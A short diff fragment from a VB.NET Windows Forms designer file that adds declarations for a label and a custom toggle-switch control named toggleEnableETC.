+    Friend WithEvents Label19 As Label
+    Friend WithEvents toggleEnableETC As MephToggleSwitch
 End Class
